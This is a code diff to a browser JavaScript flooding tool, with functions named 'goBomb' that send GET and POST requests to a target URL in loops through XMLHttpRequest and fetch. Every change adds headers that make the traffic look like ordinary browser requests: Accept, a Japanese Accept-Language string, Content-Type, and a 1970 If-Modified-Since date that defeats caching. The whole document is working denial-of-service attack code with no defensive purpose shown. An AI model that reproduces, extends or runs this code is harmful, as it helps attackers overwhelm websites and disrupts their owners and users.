@@ -25,6 +25,10 @@
 	var xhr2 = new XMLHttpRequest();
 	var count = "15";
 	var attackmode;
+	var lang = "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7";
+	var contype = "application/x-www-form-urlencoded";
+	var accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+	var ifmoded = "Thu, 01 Jun 1970 00:00:00 GMT";
 
 	//変数の一斉定義(boonv3.7から流用)--------------------------------------------
 
@@ -555,6 +559,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
  			xhr2.send();
  			//XMLHttpRequest_POST
 			xhr.open(method, bomb, async);
@@ -576,6 +582,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
  			xhr2.send();
 		}
 		bombCounter();
@@ -608,6 +616,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
  			xhr2.send();
  			//XMLHttpRequest_POST
 			xhr.open(method, bomb_url, async);
@@ -630,6 +640,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
  			xhr2.send();
 		}
 		bombCounter();
@@ -663,6 +675,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
  			xhr2.send();
  			//XMLHttpRequest_POST
 			xhr.open(method, bomb, async);
@@ -684,6 +698,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
  			xhr2.send();
 		}
 		bombCounter();
@@ -718,6 +734,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
  			xhr2.send();
  			//XMLHttpRequest_POST
 			xhr.open(method, bomb_url, async);
@@ -740,6 +758,8 @@ function goBomb_nowild_GET_ONLY()
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+			xhr2.setRequestHeader("Accept", accept);
+			xhr2.setRequestHeader("Content-Type", contype);
  			xhr2.send();
 		}
 		bombCounter();
@@ -792,7 +812,7 @@ function goBomb_nowild_GET_ONLY()
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fetch GET
-			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
 			//fech POST
 			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
@@ -808,7 +828,7 @@ function goBomb_nowild_GET_ONLY()
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fetch GET
-			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
 		}
 		bombCounter();
@@ -835,7 +855,7 @@ function goBomb_nowild_GET_ONLY()
 		{
 			bomb_url = convurl_url(1);
 			//fetch GET
-			var req = new Request(bomb_url, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
 			//fech POST
 			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
@@ -852,7 +872,7 @@ function goBomb_nowild_GET_ONLY()
 		{
 			bomb_url = convurl_url(1);
 			//fetch GET
-			var req = new Request(bomb_url, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
 		}
 		bombCounter();
@@ -880,7 +900,7 @@ function goBomb_nowild_GET_ONLY()
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fetch GET
-			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
 			//fech POST
 			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
@@ -896,7 +916,7 @@ function goBomb_nowild_GET_ONLY()
 		for(i = 0; i < m_inWinNum; i++)
 		{
 			//fetch GET
-			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
 		}
 		bombCounter();
@@ -926,7 +946,7 @@ function goBomb_fetch_nowild_POST_ONLY()
 		{
 			bomb_url = convurl_url(1);
 			//fetch GET
-			var req = new Request(bomb_url, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
 			//fech POST
 			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
@@ -943,7 +963,7 @@ function goBomb_fetch_nowild_POST_ONLY()
 		{
 			bomb_url = convurl_url(1);
 			//fetch GET
-			var req = new Request(bomb_url, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
 			fetch(req);
 		}
 		bombCounter();
